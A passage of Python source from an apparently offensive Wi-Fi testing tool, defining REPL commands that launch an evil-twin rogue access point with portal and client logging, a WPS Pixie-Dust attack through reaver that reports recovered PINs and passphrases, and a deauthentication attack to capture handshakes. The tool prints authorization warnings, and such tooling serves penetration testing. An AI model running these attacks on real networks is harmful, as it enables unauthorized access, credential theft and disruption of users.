    console.print(_target_summary("Evil Twin Simple Plan", [
        ("Interface", iface),
        ("ESSID", essid_res.value),
        ("Channel", target.channel),
        ("Clone BSSID", clone_bssid or "no"),
        ("Portal", portal_mode),
        ("Credential form", "disabled"),
        ("Metadata log", metadata_log_file),
        ("Client network", f"{tap_iface} {gateway_ip}/{cidr_prefix}"),
        ("DHCP range", f"{dhcp_start} - {dhcp_end}"),
        ("Internet access", f"via {internet_iface}" if internet_iface else "off"),
        ("Portal URL", f"http://{gateway_ip}:{portal_port}/"),
    ]))
    print_warning("Evil Twin Simple starts a rogue AP. Use only in an authorized lab or audit scope.")
    conf = prompt_confirm("Start Evil Twin Simple?")
    if conf.cancelled or not conf.value:
        return

    engine = EvilTwinEngine(
        get_manager(),
        tap_iface=tap_iface,
        gateway_ip=gateway_ip,
        cidr_prefix=cidr_prefix,
        dhcp_start=dhcp_start,
        dhcp_end=dhcp_end,
        portal_port=portal_port,
    )
    logs = []
    start = time.monotonic()

    def on_log(line):
        logs.append(line)

    try:
        with Live(
            _evil_twin_progress_panel(engine, [
                ("Interface", iface),
                ("ESSID", essid_res.value),
                ("Channel", target.channel),
                ("BSSID", clone_bssid or "generated"),
                ("Gateway", f"{gateway_ip}/{cidr_prefix}"),
                ("Log", os.path.basename(metadata_log_file)),
            ], logs, 0, portal_mode),
            console=console,
            refresh_per_second=4,
            transient=False,
        ) as live:
            task = asyncio.create_task(engine.start_rogue_ap(
                mon_iface=iface,
                essid=essid_res.value,
                channel=target.channel,
                target_bssid=clone_bssid or None,
                on_log=on_log,
                portal_mode=portal_mode,
                portal_title=portal_title,
                portal_message=portal_message,
                metadata_log_file=metadata_log_file,
                internet_iface=internet_iface,
            ))
            while not task.done():
                live.update(_evil_twin_progress_panel(engine, [
                    ("Interface", iface),
                    ("ESSID", essid_res.value),
                    ("Channel", target.channel),
                    ("BSSID", clone_bssid or "generated"),
                    ("Gateway", f"{gateway_ip}/{cidr_prefix}"),
                    ("Log", os.path.basename(metadata_log_file)),
                ], logs, time.monotonic() - start, portal_mode), refresh=True)
                await asyncio.sleep(0.25)
            ok = await task
            live.update(_evil_twin_progress_panel(engine, [
                ("Interface", iface),
                ("ESSID", essid_res.value),
                ("Channel", target.channel),
                ("BSSID", clone_bssid or "generated"),
                ("Gateway", f"{gateway_ip}/{cidr_prefix}"),
                ("Log", os.path.basename(metadata_log_file)),
            ], logs, time.monotonic() - start, portal_mode), refresh=True)
        if ok:
            print_success("Evil Twin Simple session ended.")
        else:
            print_warning("Evil Twin Simple stopped before completion.")

        if os.path.exists(metadata_log_file):
            with open(metadata_log_file) as f:
                line_count = sum(1 for _ in f)
            print_success(f"Log saved successfully to {metadata_log_file} ({line_count} structured JSON records)")

        stats = engine.stats
        portal_stats = _evil_twin_portal_stats(engine)
        recent_paths = [r["path"] for r in portal_stats.portal_requests[-5:]] if portal_stats else stats.last_portal_paths[-5:]
        console.print(_target_summary("Evil Twin Simple Summary", [
            ("Total unique clients", len(stats.associated_clients)),
            ("Live clients at exit", len(stats.live_clients)),
            ("DHCP leases", len(stats.dhcp_leases)),
            ("Portal hits", portal_stats.portal_hits if portal_stats else stats.portal_hits),
            ("Recent paths", ", ".join(recent_paths) or "none"),
            ("Metadata log", metadata_log_file),
        ]))
    except KeyboardInterrupt:
        await engine.stop()
        repl.print("  [yellow]Evil Twin Simple stopped.[/yellow]")
        stats = engine.stats
        portal_stats = _evil_twin_portal_stats(engine)
        recent_paths = [r["path"] for r in portal_stats.portal_requests[-5:]] if portal_stats else stats.last_portal_paths[-5:]
        console.print(_target_summary("Evil Twin Simple Summary", [
            ("Total unique clients", len(stats.associated_clients)),
            ("Live clients at exit", len(stats.live_clients)),
            ("DHCP leases", len(stats.dhcp_leases)),
            ("Portal hits", portal_stats.portal_hits if portal_stats else stats.portal_hits),
            ("Recent paths", ", ".join(recent_paths) or "none"),
            ("Metadata log", metadata_log_file),
        ]))

async def cmd_wps(repl):
    iface = await _select_monitor_iface(repl)
    if not iface:
        return

    target = await _select_network_target(repl, purpose="WPS", wps_only=True)
    if not target:
        return

    if not getattr(target, "wps", False):
        print_warning("Selected target was not marked WPS-enabled in scan data. Reaver may fail quickly.")

    timeout_res = _prompt_int("WPS timeout seconds", 180, 30, 3600)
    if timeout_res.cancelled:
        return
    timeout = timeout_res.value

    console.print(_target_summary("WPS Pixie-Dust Plan", [
        ("Interface", iface),
        ("Target", f"{target.display_name()} ({target.bssid})"),
        ("Channel", target.channel),
        ("WPS in scan", "yes" if getattr(target, "wps", False) else "unknown/no"),
        ("Timeout", f"{timeout}s"),
        ("Tool", "reaver -K 1"),
    ]))
    print_warning("WPS attacks can trigger AP lockouts. Use only with authorization.")
    conf = prompt_confirm("Start WPS Pixie-Dust?")
    if conf.cancelled or not conf.value:
        return

    engine = WPSEngine(get_manager())
    cfg = AttackConfig(target_bssid=target.bssid, channel=target.channel, timeout=timeout)
    logs = []
    start = time.monotonic()

    def on_progress(**kwargs):
        status = kwargs.get("status")
        if status:
            logs.append(status)

    try:
        engine.set_progress_callback(on_progress)
        with Live(
            _attack_progress_panel("WPS Pixie-Dust", [
                ("Interface", iface),
                ("Target", target.bssid),
                ("Channel", target.channel),
            ], logs, 0),
            console=console,
            refresh_per_second=4,
            transient=False,
        ) as live:
            task = asyncio.create_task(engine.start(cfg, iface=iface, timeout=timeout))
            while not task.done():
                live.update(_attack_progress_panel("WPS Pixie-Dust", [
                    ("Interface", iface),
                    ("Target", target.bssid),
                    ("Channel", target.channel),
                ], logs, time.monotonic() - start), refresh=True)
                await asyncio.sleep(0.25)
            res = await task
        if res.success:
            print_success(f"WPS Attack Succeeded!\n  PIN: {res.stats.get('wps_pin')}\n  PSK: {res.stats.get('wpa_psk')}")
        else:
            print_error("WPS Attack Failed.")
            for error in res.errors:
                print_warning(error)
    except KeyboardInterrupt:
        await engine.stop()
        repl.print("  [yellow]WPS attack stopped.[/yellow]")

async def cmd_deauth(repl):
    from swcli.repl.commands.capture import _get_deauth_params
    params = await _get_deauth_params(repl, default_count=50)
    if not params: return
    iface, bssid, channel, client, count, rate = params
    
    conf = prompt_confirm("Start Deauth Attack?")
    if conf.cancelled or not conf.value: return
    
    console.print(_target_summary("Deauth Test Plan", [
        ("Interface", iface),
        ("BSSID", bssid),
        ("Client", client),
        ("Channel", channel),
        ("Frame count", count),
        ("Capture window", "10s"),
    ]))
    repl.print("\n  [cyan]Sending bounded deauth test frames...[/cyan]")
    start = time.monotonic()
    state = {"m1": False, "m2": False, "m3": False, "m4": False, "status": "sending", "activity": "|", "analysis_passes": 0}
    activity_frames = ("|", "/", "-", "\\")
    done = False
    result = None

    def render():
        return build_handshake_progress_panel(
            title="Deauth Attack",
            iface=iface,
            bssid=bssid,
            client=client,
            channel=channel,
            count=count,
            elapsed=time.monotonic() - start,
            **state,
        )

    async def animate(live):
        idx = 0
        while not done:
            state["activity"] = activity_frames[idx % len(activity_frames)]
            state["analysis_passes"] += 1
            live.update(render(), refresh=True)
            idx += 1
            await asyncio.sleep(0.25)

    with Live(render(), console=console, refresh_per_second=6, transient=False) as live:
        anim_task = asyncio.create_task(animate(live))
        def on_progress(m1, m2, m3, m4, status):
            state.update({"m1": m1, "m2": m2, "m3": m3, "m4": m4, "status": status})
            live.update(render(), refresh=True)

        try:
            result = await capture_deauth(
                mon_iface=iface,
                bssid=bssid,
                client=client,
                channel=channel,
                output_prefix=attack_prefix("deauth"),
                count=count,
                rate=rate,
                timeout=10,
                on_progress=on_progress,
            )
        finally:
            done = True
            anim_task.cancel()
            try:
                await anim_task
            except asyncio.CancelledError:
                pass
        live.update(render(), refresh=True)
    if result:
        print_success(f"Deauth test completed. Handshake status: {result.status}")
    else:
        print_warning("Deauth test completed. No handshake was observed in the capture window.")

def register_commands(palette: CommandPalette):

    palette.register(Command("/attack evil-twin-pass", "Evil Twin Pass - Credential Capture", "Attack", cmd_evil_twin_pass))
    palette.register(Command("/attack evil-twin-simple", "Evil Twin Simple - Open AP + Logging", "Attack", cmd_evil_twin_simple))
    palette.register(Command("/attack wps", "WPS Pixie-Dust", "Attack", cmd_wps))
    palette.register(Command("/attack deauth", "Deauth Attack", "Attack", cmd_deauth))
